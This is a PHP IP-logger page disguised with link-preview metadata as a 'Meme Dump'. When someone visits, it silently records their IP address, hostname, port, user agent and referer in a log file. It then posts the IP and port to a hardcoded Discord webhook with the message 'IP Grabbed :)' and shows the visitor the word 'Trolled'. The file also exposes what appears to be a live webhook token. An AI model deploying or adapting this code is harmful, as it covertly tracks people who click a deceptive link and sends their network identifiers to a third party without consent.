<?php
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
$fh = fopen('log.txt', 'a');
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
fclose($fh);

$webhookurl = "https://discordapp.com/api/webhooks/816676135676674048/8yzIIPFjVH_1Zwu6xc51u4SFvN2oIUMoANuWw_lgkU0EwHQAeQTysP2Jr86M9iI_zZA5";

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "IP Grabbed :)",
    
    // Username
    "username" => "A",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "IP Logger",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "Grabbed IP",

            // URL of title link
            "url" => "https://policepocholo.tk",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer
            "footer" => [
                "text" => "a"
            ],
          
            "author" => [
                "name" => "policepocholo.tk",
                "url" => "https://policepocholo.tk/"
            ],

            "fields" => [
                [
                    "name" => "IP",
                    "value" => $ip,
                    "inline" => false
                ],
                [
                    "name" => "Port",
                    "value" => $port,
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

curl_close( $ch );
?>

<html>
  <head>
    <meta property="og:title" content="Memes" />
    <meta property="og:description" content="Meme Dump" />
  </head>
  <body>
    <p>Trolled</p>
  </body>
</html>
